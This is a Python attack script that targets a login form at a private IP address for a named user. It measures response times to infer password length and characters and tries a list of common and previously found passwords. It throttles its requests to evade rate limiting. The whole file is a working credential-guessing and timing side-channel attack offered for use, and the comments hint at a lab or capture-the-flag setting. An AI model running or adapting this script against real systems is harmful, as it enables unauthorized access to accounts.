#!/usr/bin/env python3
"""
HTML Form Timing Side-Channel Attack
Tests if server response time leaks information about password correctness
"""

import requests
import time
import statistics
import string

def measure_response_time(password, trials=5):
    """Measure average response time for a password attempt"""
    times = []
    
    for _ in range(trials):
        start = time.time()
        try:
            response = requests.post(
                'http://192.168.100.101/dologin.html',
                data={'httpd_username': 'wangxx', 'httpd_password': password},
                timeout=10,
                allow_redirects=False
            )
            end = time.time()
            times.append(end - start)
            
            # Small delay between attempts to avoid rate limiting
            time.sleep(0.1)
            
        except requests.exceptions.RequestException as e:
            print(f"Request failed for {password}: {e}")
            continue
    
    if times:
        return statistics.mean(times)
    return float('inf')

def test_password_length():
    """Test different password lengths to detect timing variations"""
    print("Testing password length timing variations...")
    
    test_passwords = []
    for length in range(1, 16):
        test_passwords.append('A' * length)
    
    results = []
    for password in test_passwords:
        avg_time = measure_response_time(password)
        results.append((len(password), avg_time))
        print(f"Length {len(password):2d}: {avg_time:.6f} seconds")
        
        # Rate limiting delay
        time.sleep(0.2)
    
    return results

def test_first_character():
    """Test timing variations for the first character"""
    print("\nTesting first character timing variations...")
    
    charset = string.ascii_lowercase + string.ascii_uppercase + string.digits
    base_password = 'AAAAAAA'  # 7 padding characters
    
    results = []
    for char in charset:
        test_password = char + base_password
        avg_time = measure_response_time(test_password, trials=3)
        results.append((char, avg_time))
        print(f"Char '{char}': {avg_time:.6f} seconds")
        
        # Rate limiting delay
        time.sleep(0.15)
    
    # Sort by timing to identify outliers
    results.sort(key=lambda x: x[1])
    
    print(f"\nFastest responses (potential correct characters):")
    for char, timing in results[:10]:
        print(f"'{char}': {timing:.6f}s")
    
    print(f"\nSlowest responses:")
    for char, timing in results[-5:]:
        print(f"'{char}': {timing:.6f}s")
    
    return results

def test_known_patterns():
    """Test timing with known password patterns from other tasks"""
    print("\nTesting known patterns from PVD results...")
    
    known_passwords = [
        'a1b2c3d4', 'qwerty10', 'letmein2', 'passw0rd', 
        'qaZwsX', '1q2w3e4r', 'trustno1', 'mskitty666',
        '111111', '11111111'  # Also test with 8 chars
    ]
    
    # Add 8-character variations
    variations = []
    for pwd in known_passwords:
        if len(pwd) < 8:
            variations.append(pwd + '1' * (8 - len(pwd)))
        elif len(pwd) > 8:
            variations.append(pwd[:8])
        else:
            variations.append(pwd)
    
    all_tests = known_passwords + variations
    
    results = []
    for password in all_tests:
        avg_time = measure_response_time(password, trials=4)
        results.append((password, avg_time))
        print(f"Password '{password}': {avg_time:.6f} seconds")
        
        # Rate limiting delay
        time.sleep(0.2)
    
    # Sort by timing
    results.sort(key=lambda x: x[1])
    
    print(f"\nFastest known pattern responses:")
    for pwd, timing in results[:5]:
        print(f"'{pwd}': {timing:.6f}s")
    
    return results

if __name__ == "__main__":
    print("HTML Form Timing Side-Channel Attack")
    print("=" * 50)
    
    try:
        # Test password length variations
        length_results = test_password_length()
        
        # Test first character variations  
        char_results = test_first_character()
        
        # Test known patterns
        pattern_results = test_known_patterns()
        
        print("\n" + "=" * 50)
        print("TIMING ATTACK ANALYSIS COMPLETE")
        print("=" * 50)
        
        # Look for significant timing differences
        if length_results:
            times = [t[1] for t in length_results]
            if max(times) - min(times) > 0.05:  # 50ms difference
                print("POTENTIAL LENGTH VULNERABILITY DETECTED!")
                print(f"Timing range: {min(times):.6f}s - {max(times):.6f}s")
        
        if char_results:
            char_times = [t[1] for t in char_results]
            if max(char_times) - min(char_times) > 0.02:  # 20ms difference
                print("POTENTIAL CHARACTER VULNERABILITY DETECTED!")
                print(f"Character timing range: {min(char_times):.6f}s - {max(char_times):.6f}s")
        
    except KeyboardInterrupt:
        print("\nTiming attack interrupted by user")
    except Exception as e:
        print(f"Error during timing attack: {e}")